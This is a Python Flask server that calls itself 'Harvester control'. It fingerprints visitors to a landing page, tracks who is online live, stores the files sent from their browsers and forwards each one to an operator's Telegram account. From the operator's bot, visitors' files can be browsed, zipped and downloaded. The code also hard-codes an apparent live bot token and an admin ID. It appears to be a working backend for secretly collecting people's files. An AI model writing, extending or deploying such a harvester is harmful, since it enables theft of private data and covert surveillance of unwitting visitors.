import os
import io
import time
import uuid
import json
import hashlib
import zipfile
import urllib.request

from flask import Flask, request, jsonify, render_template, send_from_directory

app = Flask(__name__)

# ---------------- storage ----------------
BASE = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.environ.get("DATA_DIR", BASE)
STORAGE = os.path.join(DATA_DIR, "storage")
VISITORS_FILE = os.path.join(DATA_DIR, "visitors.json")
os.makedirs(STORAGE, exist_ok=True)

# ---------------- config ----------------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8948181167:AAGQeYvj_dksfj_DDnW428b8OqpnTBPPlis")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7161177100"))
RAW_KEY = os.environ.get("RAW_KEY", "changeme")
WEB_PASSWORD = os.environ.get("WEB_PASSWORD", "admin")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

MAX_TG = 50 * 1024 * 1024
PAGE_SIZE = 8    # how many visitors/files per page

# ---------------- persistent state ----------------
def load_visitors():
    try:
        with open(VISITORS_FILE) as f:
            return json.load(f)
    except Exception:
        return {}


def save_visitors(v):
    try:
        with open(VISITORS_FILE, "w") as f:
            json.dump(v, f, indent=2)
    except Exception:
        pass


VISITORS = load_visitors()
MUTE = {"on": False}
LIVE = {}   # vid -> last seen ts


# ---------------- telegram helpers ----------------
def tg_call(method, params=None, files=None):
    boundary = "----ENI" + uuid.uuid4().hex
    body = b""
    params = params or {}
    for k, v in params.items():
        body += (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{k}"\r\n\r\n'
            f"{v}\r\n"
        ).encode()
    if files:
        for field, (filename, content, ctype) in files.items():
            body += (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
                f"Content-Type: {ctype}\r\n\r\n"
            ).encode()
            body += content + b"\r\n"
    body += f"--{boundary}--\r\n".encode()

    req = urllib.request.Request(
        f"{API}/{method}",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return json.loads(r.read())
    except Exception as e:
        print("tg err", method, e)
        return {"ok": False, "error": str(e)}


def send_msg(chat_id, text, keyboard=None, force=False):
    if MUTE["on"] and not force:
        return {"ok": True, "muted": True}
    p = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": "true",
    }
    if keyboard:
        p["reply_markup"] = json.dumps(keyboard)
    return tg_call("sendMessage", p)


def send_file_to_admin(filename, content, caption):
    ext = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
    if ext in ("jpg", "jpeg", "png", "webp", "gif"):
        return tg_call("sendPhoto",
                       {"chat_id": ADMIN_ID, "caption": caption},
                       {"photo": (filename, content, "image/jpeg")})
    if ext in ("mp4", "mov", "m4v", "webm"):
        return tg_call("sendVideo",
                       {"chat_id": ADMIN_ID, "caption": caption},
                       {"video": (filename, content, "video/mp4")})
    return tg_call("sendDocument",
                   {"chat_id": ADMIN_ID, "caption": caption},
                   {"document": (filename, content, "application/octet-stream")})


def build_label(d):
    ua = d.get("ua", "")
    model = ""
    if "Android" in ua:
        parts = ua.split("Android")[-1].split(";")
        if len(parts) > 1:
            model = parts[-1].split(")")[0].strip()
    if not model and "iPhone" in ua: model = "iPhone"
    if not model and "iPad"   in ua: model = "iPad"
    if not model and "Windows" in ua: model = "Windows PC"
    if not model and "Mac"    in ua: model = "Mac"
    if not model: model = "Unknown device"
    browser = "Browser"
    for b in ("Chrome", "Firefox", "Safari", "Edge", "Opera"):
        if b in ua: browser = b; break
    return f"{model} · {browser}"


# ---------------- main menu (upgrade #1) ----------------
def send_main_menu(chat_id):
    n = len(VISITORS)
    total_files = sum(len(v["files"]) for v in VISITORS.values())
    total_size = sum(f["size"] for v in VISITORS.values() for f in v["files"])
    muted = "🔇 Muted" if MUTE["on"] else "🔔 Live"
    now = int(time.time())
    live_count = sum(1 for ts in LIVE.values() if now - ts < 120)
    rows = [
        [
            {"text": "👤 Visitors", "callback_data": "menu:visitors:0"},
            {"text": "📊 Stats", "callback_data": "menu:stats"},
        ],
        [
            {"text": muted, "callback_data": "menu:mute"},
            {"text": f"🟢 Live ({live_count})", "callback_data": "menu:live"},
        ],
    ]
    send_msg(
        chat_id,
        f"🛰️ <b>Harvester control</b>\n\n"
        f"Visitors: <b>{n}</b> · Files: <b>{total_files}</b> · "
        f"Size: <b>{total_size / (1024 * 1024):.1f} MB</b>",
        keyboard={"inline_keyboard": rows},
        force=True,
    )


def send_visitors_page(chat_id, page):
    items = sorted(VISITORS.items(), key=lambda kv: -kv[1]["first_ts"])
    pages = max(1, (len(items) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    chunk = items[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]
    rows = [
        [{
            "text": f"👤 {v['label']}  ({len(v['files'])} files)",
            "callback_data": f"view:{vid}:0",
        }]
        for vid, v in chunk
    ]
    nav = []
    if page > 0:
        nav.append({"text": "« Prev", "callback_data": f"menu:visitors:{page-1}"})
    nav.append({"text": f"{page+1}/{pages}", "callback_data": "noop"})
    if page < pages - 1:
        nav.append({"text": "Next »", "callback_data": f"menu:visitors:{page+1}"})
    if nav:
        rows.append(nav)
    rows.append([{"text": "⬅️ Back", "callback_data": "menu:back"}])
    send_msg(chat_id, f"<b>Visitors</b> ({len(items)})",
             keyboard={"inline_keyboard": rows}, force=True)


def send_visitor_page(chat_id, vid, page):
    v = VISITORS.get(vid)
    if not v:
        send_msg(chat_id, "Visitor gone.", force=True)
        return
    files = v["files"]
    pages = max(1, (len(files) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    chunk = files[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]
    rows = []
    for i, f in enumerate(chunk):
        real_idx = page * PAGE_SIZE + i
        rows.append([{
            "text": f"📦 {f['name'][:40]} ({max(1, f['size']//1024)} KB)",
            "callback_data": f"file:{vid}:{real_idx}",
        }])
    nav = []
    if page > 0:
        nav.append({"text": "«", "callback_data": f"view:{vid}:{page-1}"})
    nav.append({"text": f"{page+1}/{pages}", "callback_data": "noop"})
    if page < pages - 1:
        nav.append({"text": "»", "callback_data": f"view:{vid}:{page+1}"})
    if nav:
        rows.append(nav)
    rows.append([
        {"text": "📥 Send all", "callback_data": f"all:{vid}"},
        {"text": "🗜 Zip", "callback_data": f"zip:{vid}"},
    ])
    rows.append([
        {"text": "🗑 Delete visitor", "callback_data": f"del:{vid}"},
        {"text": "⬅️ Back", "callback_data": "menu:visitors:0"},
    ])
    send_msg(
        chat_id,
        f"<b>{v['label']}</b>\nVid: <code>{vid}</code>\n"
        f"UA: <code>{v['ua'][:100]}</code>\nFiles: {len(files)}",
        keyboard={"inline_keyboard": rows},
        force=True,
    )


# ---------------- routes ----------------
@app.get("/")
def landing():
    return render_template("index.html")


@app.get("/health")
def health():
    return jsonify(ok=True, visitors=len(VISITORS), admin_set=ADMIN_ID != 0)


@app.post("/register")
def register():
    d = request.get_json(force=True)
    vid = d.get("vid") or uuid.uuid4().hex[:10]
    label = build_label(d)
    v = VISITORS.get(vid, {
        "vid": vid, "label": label, "ua": d.get("ua", ""),
        "platform": d.get("platform", ""), "screen": d.get("screen", ""),
        "tz": d.get("tz", ""), "first_ts": int(time.time() * 1000),
        "files": []
    })
    v["label"] = label
    VISITORS[vid] = v
    save_visitors(VISITORS)
    if ADMIN_ID:
        send_msg(
            ADMIN_ID,
            f"👤 <b>New visitor</b>\n<b>Label:</b> {label}\n"
            f"<b>Vid:</b> <code>{vid}</code>\n"
            f"<b>Time:</b> {time.strftime('%Y-%m-%d %H:%M')}"
        )
    return jsonify(ok=True, vid=vid, label=label)


@app.post("/ping")
def ping():
    d = request.get_json(force=True) or {}
    vid = d.get("vid")
    if vid:
        LIVE[vid] = int(time.time())
    return jsonify(ok=True)


@app.post("/upload")
def upload():
    vid = request.form.get("vid", "unknown")
    f = request.files.get("file")
    if not f:
        return jsonify(ok=False, reason="empty"), 400

    # upgrade #8: reject empty files
    if not f.filename or f.filename.strip() == "":
        return jsonify(ok=False, reason="no-name"), 400

    # upgrade #7: dedupe by content hash
    content = f.read()
    if len(content) == 0:
        return jsonify(ok=False, reason="zero-bytes"), 400
    digest = hashlib.sha256(content).hexdigest()[:16]

    if vid in VISITORS:
        if any(x.get("hash") == digest for x in VISITORS[vid]["files"]):
            return jsonify(ok=True, dedup=True)

    safe = uuid.uuid4().hex[:8] + "_" + os.path.basename(f.filename)
    path = os.path.join(STORAGE, safe)
    with open(path, "wb") as out:
        out.write(content)
    size = len(content)

    if vid in VISITORS:
        VISITORS[vid]["files"].append({
            "name": f.filename, "stored": safe, "size": size,
            "ts": int(time.time() * 1000), "hash": digest
        })
        save_visitors(VISITORS)
        label = VISITORS[vid]["label"]
    else:
        label = "Unknown visitor"

    if ADMIN_ID:
        try:
            if size <= MAX_TG:
                caption = (f"📎 <b>{f.filename}</b>\nFrom: <b>{label}</b>\n"
                           f"Vid: <code>{vid}</code>\nSize: {max(1, size//1024//1024)} MB")
                send_file_to_admin(f.filename, content, caption)
            else:
                send_msg(
                    ADMIN_ID,
                    f"⚠️ <b>Oversized</b>\n{f.filename} · {size//1024//1024} MB\n"
                    f"From: {label}\nDownload: "
                    f"<a href='https://{request.host}/raw/{safe}?k={RAW_KEY}'>/raw/{safe}</a>"
                )
        except Exception as e:
            print("push err", e)

    return jsonify(ok=True, stored=safe, size=size)


@app.get("/raw/<stored>")
def raw(stored):
    if request.args.get("k") != RAW_KEY:
        return "forbidden", 403
    return send_from_directory(STORAGE, stored, as_attachment=True)


# ---------------- web admin panel (upgrade #6) ----------------
@app.get("/admin")
def admin_panel():
    if request.args.get("p") != WEB_PASSWORD:
        return "forbidden", 403
    return render_template("admin.html")


@app.get("/admin/data")
def admin_data():
    if request.args.get("p") != WEB_PASSWORD:
        return jsonify(ok=False), 403
    return jsonify(ok=True, visitors=VISITORS, mute=MUTE["on"], live=LIVE)


@app.post("/admin/mute")
def admin_mute():
    if request.args.get("p") != WEB_PASSWORD:
        return jsonify(ok=False), 403
    MUTE["on"] = not MUTE["on"]
    return jsonify(ok=True, mute=MUTE["on"])


@app.post("/admin/delete")
def admin_delete():
    if request.args.get("p") != WEB_PASSWORD:
        return jsonify(ok=False), 403
    vid = request.args.get("vid")
    if vid in VISITORS:
        for f in VISITORS[vid]["files"]:
            p = os.path.join(STORAGE, f["stored"])
            try: os.remove(p)
            except: pass
        del VISITORS[vid]
        save_visitors(VISITORS)
    return jsonify(ok=True)


@app.get("/admin/zip")
def admin_zip():
    if request.args.get("p") != WEB_PASSWORD:
        return "forbidden", 403
    vid = request.args.get("vid")
    v = VISITORS.get(vid)
    if not v:
        return "not found", 404
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for f in v["files"]:
            p = os.path.join(STORAGE, f["stored"])
            if os.path.exists(p):
                z.write(p, arcname=f["name"])
    buf.seek(0)
    return send_from_directory(
        STORAGE, "dummy", as_attachment=False
    ) if False else app.response_class(
        buf.read(),
        mimetype="application/zip",
        headers={"Content-Disposition": f"attachment; filename={vid}.zip"},
    )


# ---------------- telegram webhook ----------------
@app.post("/webhook")
def webhook():
    upd = request.get_json(force=True) or {}
    msg = upd.get("message") or {}
    text = msg.get("text", "")
    chat_id = msg.get("chat", {}).get("id")
    cb = upd.get("callback_query")

    if chat_id and chat_id != ADMIN_ID:
        return jsonify(ok=True)

    if text == "/start":
        send_main_menu(chat_id)
        return jsonify(ok=True)

    if text.startswith("/search"):
        term = text.replace("/search", "", 1).strip().lower()
        hits = [(vid, v) for vid, v in VISITORS.items()
                if term in v.get("label", "").lower() or term in vid.lower()]
        if not hits:
            send_msg(chat_id, "No matches.", force=True)
        else:
            rows = [[{"text": f"👤 {v['label']}", "callback_data": f"view:{vid}:0"}]
                    for vid, v in hits[:10]]
            send_msg(chat_id, f"<b>Search: {term}</b> ({len(hits)})",
                     keyboard={"inline_keyboard": rows}, force=True)
        return jsonify(ok=True)

    if cb:
        data = cb.get("data", "")
        cb_id = cb["id"]

        if data == "noop":
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data == "menu:back":
            send_main_menu(chat_id)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data == "menu:stats":
            total = sum(len(v["files"]) for v in VISITORS.values())
            size = sum(f["size"] for v in VISITORS.values() for f in v["files"])
            biggest = max((f["size"] for v in VISITORS.values() for f in v["files"]), default=0)
            send_msg(chat_id,
                f"📊 <b>Stats</b>\nVisitors: <b>{len(VISITORS)}</b>\n"
                f"Files: <b>{total}</b>\nTotal: <b>{size/(1024*1024):.1f} MB</b>\n"
                f"Largest: <b>{biggest/(1024*1024):.1f} MB</b>",
                keyboard={"inline_keyboard": [
                    [{"text": "⬅️ Back", "callback_data": "menu:back"}]]},
                force=True)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data == "menu:mute":
            MUTE["on"] = not MUTE["on"]
            state = "🔇 Muted" if MUTE["on"] else "🔔 Live"
            send_msg(chat_id, f"Notifications: <b>{state}</b>",
                     keyboard={"inline_keyboard": [
                         [{"text": "⬅️ Back", "callback_data": "menu:back"}]]},
                     force=True)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data == "menu:live":
            now = int(time.time())
            active = [(vid, ts) for vid, ts in LIVE.items() if now - ts < 120]
            if not active:
                body = "No one on the page right now."
            else:
                lines = []
                for vid, ts in sorted(active, key=lambda x: -x[1]):
                    v = VISITORS.get(vid, {})
                    lines.append(f"🟢 <b>{v.get('label', vid)}</b> — {now-ts}s ago")
                body = "\n".join(lines)
            send_msg(chat_id, f"<b>Live now</b> ({len(active)})\n\n{body}",
                     keyboard={"inline_keyboard": [
                         [{"text": "⬅️ Back", "callback_data": "menu:back"}]]},
                     force=True)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data.startswith("menu:visitors:"):
            page = int(data.split(":")[2])
            send_visitors_page(chat_id, page)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data.startswith("view:"):
            _, vid, page = data.split(":")
            send_visitor_page(chat_id, vid, int(page))
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data.startswith("file:"):
            _, vid, idx = data.split(":", 2)
            v = VISITORS.get(vid)
            if v:
                f = v["files"][int(idx)]
                p = os.path.join(STORAGE, f["stored"])
                if os.path.exists(p):
                    content = open(p, "rb").read()
                    if f["size"] <= MAX_TG:
                        send_file_to_admin(f["name"], content,
                            f"📎 {f['name']}\nFrom: {v['label']}")
                    else:
                        send_msg(chat_id,
                            f"⚠️ <code>{f['name']}</code> too big.\n"
                            f"Download: <a href='https://{request.host}/raw/{f['stored']}?k={RAW_KEY}'>link</a>",
                            force=True)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data.startswith("all:"):
            vid = data.split(":", 1)[1]
            v = VISITORS.get(vid)
            if v:
                for f in v["files"]:
                    p = os.path.join(STORAGE, f["stored"])
                    if not os.path.exists(p): continue
                    content = open(p, "rb").read()
                    if f["size"] <= MAX_TG:
                        send_file_to_admin(f["name"], content,
                            f"📎 {f['name']}\nFrom: {v['label']}")
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data.startswith("zip:"):
            vid = data.split(":", 1)[1]
            v = VISITORS.get(vid)
            if v and v["files"]:
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
                    for f in v["files"]:
                        p = os.path.join(STORAGE, f["stored"])
                        if os.path.exists(p):
                            z.write(p, arcname=f["name"])
                buf.seek(0)
                zdata = buf.read()
                if len(zdata) <= MAX_TG:
                    tg_call("sendDocument",
                            {"chat_id": chat_id,
                             "caption": f"🗜 {v['label']} — {len(v['files'])} files "
                                        f"({len(zdata)/(1024*1024):.1f} MB)"},
                            {"document": (
                                f"{v['label'].replace(' ', '_')}.zip",
                                zdata, "application/zip")})
                else:
                    zname = f"{vid}.zip"
                    with open(os.path.join(STORAGE, zname), "wb") as out:
                        out.write(zdata)
                    send_msg(chat_id,
                        f"🗜 Zip too big for Telegram.\n"
                        f"Download: <a href='https://{request.host}/raw/{zname}?k={RAW_KEY}'>link</a>",
                        force=True)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

        if data.startswith("del:"):
            vid = data.split(":", 1)[1]
            if vid in VISITORS:
                for f in VISITORS[vid]["files"]:
                    try: os.remove(os.path.join(STORAGE, f["stored"]))
                    except: pass
                del VISITORS[vid]
                save_visitors(VISITORS)
            send_visitors_page(chat_id, 0)
            tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
            return jsonify(ok=True)

    return jsonify(ok=True)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
